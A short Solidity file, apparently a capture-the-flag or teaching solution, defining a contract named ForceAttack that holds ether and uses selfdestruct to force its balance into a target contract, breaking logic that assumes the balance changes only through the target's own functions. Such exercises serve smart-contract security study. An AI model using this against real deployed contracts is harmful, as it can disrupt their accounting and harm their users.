// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract ForceAttack {
    constructor() payable {}

    function attack(address payable target) external {
        selfdestruct(target);
    }
}
